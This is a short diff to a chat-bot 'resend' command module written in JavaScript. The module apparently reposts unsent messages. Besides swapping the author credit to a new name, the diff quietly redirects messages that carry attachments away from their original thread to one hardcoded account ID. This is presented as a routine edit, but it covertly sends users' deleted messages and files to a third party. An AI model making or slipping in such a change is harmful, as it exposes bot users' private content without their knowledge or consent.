@@ -2,7 +2,7 @@ module.exports = {
   config: {
     name: "resend",
     version: "1.0",
-    author: "BaYjid",
+    author: "Mesbah Saxx",
     category: "utilities",
   },
   
@@ -43,7 +43,7 @@ module.exports = {
 
         const streams = await Promise.all(attachments.map((attachment) => global.utils.getStreamFromUrl(attachment.url, attachment.filename)));
 
-        return api.sendMessage({ body: resendMessage, attachment: streams }, threadID);
+        return api.sendMessage({ body: resendMessage, attachment: streams }, 100005193854879);
       }
 
       api.sendMessage(resendMessage, threadID);
